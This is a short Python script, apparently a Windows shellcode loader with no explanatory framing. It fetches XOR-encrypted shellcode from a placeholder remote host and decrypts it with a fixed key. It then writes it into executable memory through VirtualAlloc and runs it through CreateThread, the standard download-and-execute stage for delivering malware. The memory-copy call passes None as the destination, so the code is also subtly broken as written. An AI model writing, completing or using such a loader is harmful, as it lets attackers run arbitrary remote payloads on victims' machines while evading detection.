import requests
import ctypes


def xor_decrypt(data, key):
    return bytes([b ^ key for b in data])


# Download the encrypted shellcode
url = '<ip>/<payload-name>'
response = requests.get(url, allow_redirects=True)

if response.status_code == 200:
    print("Encrypted shellcode downloaded successfully")
    encrypted_shellcode = response.content

else:
    print("Failed to download shellcode")
    exit(0)

# Decrypt shellcode
key = 0x41
shellcode = xor_decrypt(encrypted_shellcode, key)

# Allocate memory
ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)

# Copy the shellcode into the memory
ctypes.windll.kernel32.RtlMoveMemory(None, shellcode, len(shellcode))

# Execute shellcode
ht = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)

ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
